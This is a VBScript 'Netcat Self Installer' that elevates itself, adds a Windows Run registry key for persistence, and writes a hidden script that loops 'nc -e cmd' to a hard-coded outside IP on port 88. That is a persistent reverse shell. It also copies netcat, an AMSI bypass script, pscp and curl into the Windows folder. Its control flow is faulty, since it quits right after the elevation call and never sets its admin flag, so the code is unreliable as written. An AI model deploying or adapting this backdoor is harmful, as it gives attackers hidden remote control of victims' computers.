'Netcat Self Installer Made by xp4xbox http://www.instructables.com/id/Netcat/
Option Explicit
Dim intIsAdmin, intAreYouSure, strPath, objFile
Const cTitle = "Installer"
Dim objFso : Set objFso = CreateObject("Scripting.FileSystemObject")
Dim objWshShl : Set objWshShl = CreateObject("WScript.Shell")

CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & _
WScript.ScriptFullName & """" & " RunAsAdministrator",,"runas", 1
WScript.Quit

objWshShl.CurrentDirectory = objFso.GetParentFolderName(WScript.ScriptFullName)

If  Not objFso.FileExists("nc.exe") Then
	MsgBox "Netcat (nc.exe) mus be in the same directory as this file!",16,"Error"
	WScript.Quit()
End If

strPath = objWshShl.ExpandEnvironmentStrings("%windir%")

WriteToRegistry()
CreateFile()
MoveFile()
Finish()

Function WriteToRegistry()
	If intIsAdmin = 6 Then
		objWshShl.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\nc", strPath & "\Run.vbs", "REG_SZ"
	Else:
		objWshShl.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\nc", strPath & "\Run.vbs", "REG_SZ"
	End If
End Function

Function CreateFile()
	objWshShl.CurrentDirectory = strPath & "\"
	Set objFile = objFso.OpenTextFile("Run.vbs",2, True)
	objFile.WriteLine "Dim objWshShl : Set objWshShl = WScript.CreateObject(""WScript.Shell"")"
	If intIsAdmin = 6 Then
		objFile.WriteLine "objWshShl.CurrentDirectory = objWshShl.ExpandEnvironmentStrings(""%windir%"")"
	Else
		objFile.WriteLine "objWshShl.CurrentDirectory = objWshShl.ExpandEnvironmentStrings(""%appdata%"")"
	End If
        objFile.WriteLine "objWshShl.Run ""powershell.exe while($true) { nc -e cmd 213.168.249.164 88}; start-sleep 5"",0"
	WScript.Sleep 500
	objFile.Close()
	objWshShl.CurrentDirectory = objFso.GetParentFolderName(WScript.ScriptFullName)
End Function

Function MoveFile()
		WScript.Sleep 200
		objFso.CopyFile "nc.exe", strPath & "\"
		objFso.CopyFile "AMSI_bypass.ps1", strPath & "\"
		objFso.CopyFile "es.exe", strPath & "\"
		objFso.CopyFile "grep.exe", strPath & "\"
		objFso.CopyFile "pscp.exe", strPath & "\"
		objFso.CopyFile "ft.ps1", strPath & "\"
		objFso.CopyFile "ftcmd.bat", strPath & "\"
		objFso.CopyFile "curl.exe", strPath & "\"
		objFso.CopyFile "fzf.exe", strPath & "\"
		objFso.CopyFile "revo.exe", strPath & "\"
End Function

Function Finish()
End Function

